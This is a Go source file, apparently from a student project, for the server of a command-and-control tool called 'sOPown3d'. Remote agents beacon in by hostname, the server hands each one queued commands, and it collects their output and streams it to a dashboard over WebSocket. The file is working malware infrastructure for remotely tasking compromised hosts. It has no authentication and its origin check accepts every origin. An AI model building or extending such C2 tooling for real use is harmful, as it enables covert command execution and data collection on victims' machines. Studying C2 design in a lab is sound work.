package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"time"

	"sOPown3d/shared"

	"github.com/gorilla/websocket"
)

var (
	connectionCount = 0
	pendingCommands = make(map[string]shared.Command) // init une map avec les commandes en attentes d'execution par l'agent
	templates       *template.Template                // var pour les templates

	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true }, // TODO : Wtf is a websocket Upgrader
	}
	wsClients = make(map[string]*websocket.Conn) // init du client pour le webSocket
)

func init() {
	templates = template.Must(template.ParseGlob("templates/*.html")) // Charger les templates à l'init
}

func main() {
	// Get port from environment variable, default to 8081 if not set
	port := os.Getenv("PORT")
	if port == "" {
		port = "8081"
	}

	fmt.Println(
		"=== Serveur sOPown3d - Gestion Commandes ===\n" +
			"URL: http://127.0.0.1:" + port + "\n" +
			"Usage académique uniquement\n" +
			"============================================")

	http.HandleFunc("/beacon", handleBeacon)
	http.HandleFunc("/ingest", handleIngest)
	http.HandleFunc("/command", handleSendCommand)
	http.HandleFunc("/websocket", handleWebSocket)
	http.HandleFunc("/", handleDashboard)

	err := http.ListenAndServe("127.0.0.1:"+port, nil)
	if err != nil {
		fmt.Println("Erreur:", err)
	}
}

func handleDashboard(w http.ResponseWriter, _ *http.Request) {
	data := shared.DashboardData{
		AgentInfo:    "AgentID à voir comment recupérer dynamiquement", // Nul
		DefaultAgent: "Nicolass-MacBook-Pro.local",
	}

	err := templates.ExecuteTemplate(w, "dashboard.html", data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		fmt.Println("Erreur template:", err)
		return
	}
}

func handleBeacon(w http.ResponseWriter, request *http.Request) {
	if request.Method != "POST" {
		http.Error(w, "POST seulement", 405)
		return
	}

	connectionCount++

	var agentInfo shared.AgentInfo
	err := json.NewDecoder(request.Body).Decode(&agentInfo)

	now := time.Now().Format("15:04:05")

	if err != nil {
		fmt.Printf("[%s] Erreur JSON\n", now)
		w.WriteHeader(400)
		return
	}

	agentID := agentInfo.Hostname

	if cmd, exists := pendingCommands[agentID]; exists {
		json.NewEncoder(w).Encode(cmd)
		delete(pendingCommands, agentID)
		fmt.Printf("    → Envoyé: %s\n", cmd.Action)
	} else {
		w.WriteHeader(200)
		w.Write([]byte("{}"))
	}
}

func handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "POST seulement", 405)
		return
	}

	var cmd shared.Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	pendingCommands[cmd.ID] = cmd

	fmt.Printf("[!] Commande pour %s: %s\n", cmd.ID, cmd.Action)

	w.Write([]byte(`{"status": "ok"}`))
}

func handleIngest(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "POST seulement", 405)
		return
	}

	var result struct {
		AgentID string `json:"agent_id"`
		Output  string `json:"output"`
	}

	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, err.Error(), 400)
		return
	}

	fmt.Printf("> agent_id=%s,\r\n output=%q\n", result.AgentID, result.Output)

	if conn, exists := wsClients[result.AgentID]; exists {
		fmt.Println("📡 Envoi WS à", result.AgentID)
		conn.WriteMessage(websocket.TextMessage, []byte(result.Output))
	} else {
		fmt.Println("⚠️ Aucun WS pour", result.AgentID)
	}
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	agentId := r.URL.Query().Get("agent") // clé dans l'url
	fmt.Println("🛰️ Nouveau WS pour agent:", agentId)

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		fmt.Println("Erreur upgrade WS:", err)
		return
	}

	wsClients[agentId] = conn

	// Pour garder la connection en vie :
	for {
		if _, _, err := conn.ReadMessage(); err != nil { // Si erreur il y'a
			fmt.Println("WS fermé pour agent:", agentId, "err:", err)
			delete(wsClients, agentId) // Supprime la connexion avec l'agent ID ? Est ce qu'une autre est créer ?
			break
		}
	}
}
